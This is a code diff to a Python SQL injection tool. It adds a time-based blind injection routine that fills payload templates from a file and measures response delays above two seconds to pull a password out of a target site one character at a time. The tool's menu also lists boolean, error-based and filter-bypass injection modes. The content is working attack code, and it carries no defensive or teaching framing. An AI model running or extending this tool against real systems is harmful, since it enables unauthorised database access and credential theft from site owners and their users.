@@ -1,6 +1,6 @@
 import requests
 import string
-
+import time
 
 char = string.printable
 session = requests.Session()
@@ -94,6 +94,33 @@ def Get_Error_based(p):
                 break
     f1.close()
 
+#Get Time base
+def Get_Time_based(p):
+    f1 = open("time-based.txt", "r")
+    list=[]        
+    for ch in f1:                
+        print(ch)
+        list.append(ch)
+    
+    user_ch = int(input("your choose : "))
+    col = input("column : ")
+    len_pw = int(input("length :"))
+    password = ""
+    s_p = input("Sepecial params : ")
+    for i in range(1, len_pw):
+        for j in char:
+            start = time.time()
+            pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", str(ord(j))).replace("\n", "").replace("{col}" , col)
+            get = session.get(url=url, headers=header, params=f"{p}={pw[2:]}")            
+            timing = time.time() - start
+            print(timing)
+            if timing > 2:
+                print(len(get.text), pw[2:], get.url)
+                password = password + j
+                print(password)
+                break    
+
+    f1.close()
 #Get Payload have filter replace
 def Get_Filter(list_filter):
     print(list_filter)
@@ -147,6 +174,7 @@ while(True):
         print("3.Boolean sql")
         print("4.Error based sql")
         print("5.Your payload + filter bypass ")
+        print("6.Time based sql")
         choose_get = int(input("choose : "))
         if choose_get == 1 :
             Filter(p , list_filter)
@@ -158,6 +186,8 @@ while(True):
             Get_Error_based(p)
         elif choose_get == 5:
             Get_Filter(list_filter)
+        elif choose_get == 6:
+            Get_Time_based(p)
     elif choose == 2: # khoi tao data
         c = int(input("How many data : "))
         d = []
